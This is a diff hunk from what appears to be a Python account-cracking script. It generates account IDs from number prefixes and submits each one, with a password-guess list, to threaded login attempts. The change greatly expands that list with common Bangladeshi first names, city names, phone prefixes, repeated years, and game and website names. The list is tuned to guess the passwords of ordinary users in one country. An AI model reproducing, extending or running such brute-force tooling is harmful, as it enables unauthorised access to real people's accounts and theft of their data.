@@ -152,7 +152,7 @@ def fuck():
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia1','sadiya','fuck you','fuckyou','sumaiya','fariya']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia123','sadiya','fuck you','fuckyou','sumaiya','fariya','jessore','khulna','nusrat jahan','password','jannatul','barishal','shanto','mimmim','017017','0987654321','tiktok','321321','019019','016016','018018','khatun','mohammad','free fire game','pubg pubg','pubgpubg','pubg game','20232023','20222022','20212021','20202020','20192019','20182018','face book','facebook','20092009','sadia@','farjana','brishti','brishty','nabila','youtube','google','messenger','xvideo','xvideos']
             yaari.submit(DEVHIS2,uid,pwx,tl)
     print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
